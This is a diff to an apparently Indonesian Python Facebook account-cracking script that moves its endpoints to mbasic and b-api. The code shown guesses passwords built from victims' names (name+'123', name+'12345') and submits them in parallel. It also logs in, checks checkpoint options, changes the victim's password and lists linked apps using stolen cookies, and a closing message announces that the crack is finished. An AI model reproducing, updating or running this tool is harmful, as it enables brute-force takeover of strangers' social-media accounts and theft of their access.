@@ -431,11 +431,11 @@ def cek_opsi(user,pw):
 	global loop,ubahP,pwbaru
 	session=requests.Session()
 	session.headers.update({
-		"Host":"https://b-api.facebook.com",
+		"Host":"mbasic.facebook.com",
 		"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
 		"accept-encoding":"gzip, deflate",
 		"accept-language":"en-US;q=0.9",
-		"referer":"https://www.facebook.com/",
+		"referer":"https://mbasic.facebook.com/",
 		"user-agent":"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"
 	})
 	soup=parser(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
@@ -443,7 +443,7 @@ def cek_opsi(user,pw):
 	for x in soup("input"):
 		data.update({x.get("name"):x.get("value")})
 	data.update({"email":user,"pass":pw})
-	urlPost=session.post("https://www.facebook.com"+link.get("action"),data=data)
+	urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
 	response=parser(urlPost.text, "html.parser")
 	if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
 		print("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
@@ -519,7 +519,7 @@ def ubah_pw(user,pw,session,response,link2):
 		cek_game(coki)
 
 def cek_game(cookie):
-	w=s.get("https://www.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookie).text
+	w=s.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=cookie).text
 	sop = parser(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
@@ -711,7 +711,7 @@ def sandiotomatis():
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
-				fall.submit(mfbasic, uid, pwx,"https://m.facebook.com")
+				fall.submit(mfbasic, uid, pwx,"https://b-api.facebook.com")
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 		
 ### BAGIAN CRACK ###
